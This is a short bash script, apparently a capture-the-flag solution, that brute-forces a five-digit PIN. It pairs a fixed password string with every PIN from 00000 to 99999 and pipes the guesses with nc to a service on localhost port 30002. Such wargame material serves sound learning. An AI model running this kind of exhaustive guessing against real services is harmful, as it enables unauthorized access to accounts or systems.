#! /bin/bash

for i in $(seq -w 00000 99999);
do
    echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> /tmp/tmp.8hCvuPbWXp/attempts.txt
    echo "Pin attempt: $i"
done

cat /tmp/tmp.8hCvuPbWXp/attempts.txt | nc localhost 30002 > /tmp/tmp.8hCvuPbWXp/output.txt